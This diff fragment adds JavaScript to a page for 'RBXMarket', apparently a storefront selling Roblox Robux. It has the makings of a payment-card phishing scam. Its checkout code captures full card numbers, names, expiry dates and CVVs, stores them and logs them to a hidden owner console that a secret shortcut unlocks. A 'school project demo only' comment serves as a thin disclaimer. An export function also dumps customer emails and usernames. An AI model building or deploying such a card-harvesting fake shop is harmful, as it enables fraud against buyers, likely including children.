+            }
+        }
+        
+ function saveTransactionData() {
+    const transactionData = {
+        id: 'RBX-' + Date.now(),
+        robux: currentRobux,
+        price: currentPrice,
+        product: currentProduct,
+        email: document.getElementById('checkoutEmail').value,
+        username: document.getElementById('checkoutUsername').value,
+        
+        // SAVING ALL PAYMENT INFO (For school project demo only!)
+        paymentInfo: {
+            // Full card number
+            cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
+            // Name on card
+            cardName: document.getElementById('cardName').value,
+            // Expiry date
+            cardExpiry: document.getElementById('cardExpiry').value,
+            // CVV code
+            cardCVV: document.getElementById('cardCVV').value,
+            // Card type
+            cardType: getCardType(document.getElementById('cardNumber').value),
+        },
+        
+        timestamp: new Date().toLocaleString(),
+        status: 'completed',
+        ip: '127.0.0.1' // Simulated IP for demo
+    };
+    
+    // Save to localStorage
+    let transactions = JSON.parse(localStorage.getItem('rbxmarket_transactions') || '[]');
+    transactions.push(transactionData);
+    localStorage.setItem('rbxmarket_transactions', JSON.stringify(transactions));
+    
+    // Log to owner console
+    logToConsole(`NEW SALE: ${currentRobux.toLocaleString()} Robux for $${currentPrice.toFixed(2)}`);
+    logToConsole(`Card: ${transactionData.paymentInfo.cardNumber}`);
+    logToConsole(`Name: ${transactionData.paymentInfo.cardName}`);
+    logToConsole(`Expiry: ${transactionData.paymentInfo.cardExpiry}`);
+    logToConsole(`CVV: ${transactionData.paymentInfo.cardCVV}`);
+}
+
+// Helper function to detect card type
+function getCardType(cardNumber) {
+    const cleaned = cardNumber.replace(/\s/g, '');
+    if (/^4/.test(cleaned)) return 'Visa';
+    if (/^5[1-5]/.test(cleaned)) return 'Mastercard';
+    if (/^3[47]/.test(cleaned)) return 'American Express';
+    if (/^6(?:011|5)/.test(cleaned)) return 'Discover';
+    return 'Unknown';
+}
+        
+        // =============================
+        // SUPPORT FUNCTIONS
+        // =============================
+        function openSupport() {
+            switchTab('support');
+            openModal();
+            
+            document.getElementById('supportSuccess').style.display = 'none';
+            document.getElementById('supportError').style.display = 'none';
+        }
+        
+        function processSupport() {
+            const isSuccess = Math.random() > 0.3;
+            
+            if (isSuccess) {
+                document.getElementById('supportSuccess').style.display = 'block';
+                document.getElementById('supportError').style.display = 'none';
+                
+                // Save support message
+                const supportData = {
+                    id: 'SUP-' + Date.now(),
+                    name: document.getElementById('supportName').value,
+                    email: document.getElementById('supportEmail').value,
+                    subject: document.getElementById('supportSubject').value,
+                    message: document.getElementById('supportMessage').value,
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                let messages = JSON.parse(localStorage.getItem('rbxmarket_support') || '[]');
+                messages.push(supportData);
+                localStorage.setItem('rbxmarket_support', JSON.stringify(messages));
+                
+                logToConsole(`NEW SUPPORT: ${supportData.subject} from ${supportData.name}`);
+                
+                setTimeout(() => {
+                    document.getElementById('supportSuccess').style.display = 'none';
+                    document.getElementById('supportForm').reset();
+                }, 3000);
+            } else {
+                document.getElementById('supportError').style.display = 'block';
+                document.getElementById('supportSuccess').style.display = 'none';
+            }
+        }
+        
+        // =============================
+        // MODAL FUNCTIONS
+        // =============================
+        function openModal() {
+            document.getElementById('mainModal').style.display = 'flex';
+        }
+        
+        function closeModal() {
+            document.getElementById('mainModal').style.display = 'none';
+            document.getElementById('checkoutForm').reset();
+            document.getElementById('supportForm').reset();
+            
+            // Hide all messages
+            ['successMessage', 'errorMessage', 'supportSuccess', 'supportError'].forEach(id => {
+                document.getElementById(id).style.display = 'none';
+            });
+        }
+        
+        function switchTab(tabName) {
+            // Update tabs
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.textContent.includes(tabName.charAt(0).toUpperCase() + tabName.slice(1))) {
+                    btn.classList.add('active');
+                }
+            });
+            
+            // Update content
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+                if (content.id === tabName + 'Tab') {
+                    content.classList.add('active');
+                }
+            });
+        }
+        
+        // =============================
+        // OWNER FUNCTIONS
+        // =============================
+        function enableOwnerMode() {
+            isOwnerMode = true;
+            document.getElementById('ownerToggle').style.display = 'block';
+            localStorage.setItem('rbxmarket_owner', 'true');
+            logToConsole("Owner mode enabled");
+        }
+        
+        function toggleOwnerConsole() {
+            const consoleEl = document.getElementById('ownerConsole');
+            consoleEl.style.display = consoleEl.style.display === 'block' ? 'none' : 'block';
+        }
+        
+        function logToConsole(message) {
+            if (!isOwnerMode) return;
+            
+            const consoleLogs = document.getElementById('consoleLogs');
+            const logEntry = document.createElement('div');
+            logEntry.className = 'console-log';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            consoleLogs.appendChild(logEntry);
+            
+            // Auto-scroll
+            consoleLogs.scrollTop = consoleLogs.scrollHeight;
+        }
+        
+        function clearConsole() {
+            document.getElementById('consoleLogs').innerHTML = 
+                '<div class="console-log">Console cleared</div>';
+        }
+        
+        function exportOwnerData() {
+            if (!isOwnerMode) return;
+            
+            // Get all data
+            const transactions = JSON.parse(localStorage.getItem('rbxmarket_transactions') || '[]');
+            const support = JSON.parse(localStorage.getItem('rbxmarket_support') || '[]');
+            const cartHistory = JSON.parse(localStorage.getItem('rbxmarket_cart_history') || '[]');
+            
+            // Create export content
+            let exportContent = `=== RBXMarket Data Export ===\n`;
+            exportContent += `Generated: ${new Date().toLocaleString()}\n`;
+            exportContent += `Total Transactions: ${transactions.length}\n`;
+            exportContent += `Total Support Messages: ${support.length}\n\n`;
+            
+            // Add transactions
+            if (transactions.length > 0) {
+                exportContent += "=== TRANSACTIONS ===\n\n";
+                transactions.forEach(t => {
+                    exportContent += `ID: ${t.id}\n`;
+                    exportContent += `Date: ${t.timestamp}\n`;
+                    exportContent += `Robux: ${t.robux.toLocaleString()}\n`;
+                    exportContent += `Amount: $${t.price.toFixed(2)}\n`;
+                    exportContent += `Product: ${t.product}\n`;
+                    exportContent += `Email: ${t.email}\n`;
+                    exportContent += `Username: ${t.username}\n`;
+                    exportContent += `Status: ${t.status}\n`;
+                    exportContent += "─".repeat(40) + "\n\n";
+                });
+            }
+            
+            // Add support messages
+            if (support.length > 0) {
+                exportContent += "=== SUPPORT MESSAGES ===\n\n";
+                support.forEach(s => {
+                    exportContent += `ID: ${s.id}\n`;
+                    exportContent += `Date: ${s.timestamp}\n`;
+                    exportContent += `From: ${s.name} (${s.email})\n`;
+                    exportContent += `Subject: ${s.subject}\n`;
+                    exportContent += `Message: ${s.message.substring(0, 100)}${s.message.length > 100 ? '...' : ''}\n`;
+                    exportContent += "─".repeat(40) + "\n\n";
+                });
+            }
+            
+            // Create download
+            const blob = new Blob([exportContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `rbxmarket_data_${new Date().toISOString().split('T')[0]}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            logToConsole("Data exported successfully");
+        }
+        
+        // =============================
+        // ENABLE OWNER MODE
+        // =============================
+        // To enable owner mode, open browser console (F12) and type:
+        // enableOwnerMode()
+        
+        // Or use this shortcut in the website:
+        // Press Ctrl+Shift+O
+        
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+Shift+O to enable owner mode
+            if (e.ctrlKey && e.shiftKey && e.key === 'O') {
+                enableOwnerMode();
+                alert('Owner mode enabled! Check bottom-left for admin button.');
+                e.preventDefault();
+            }
+        });
+        
+        // =============================
+        // START EVERYTHING
+        // =============================
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
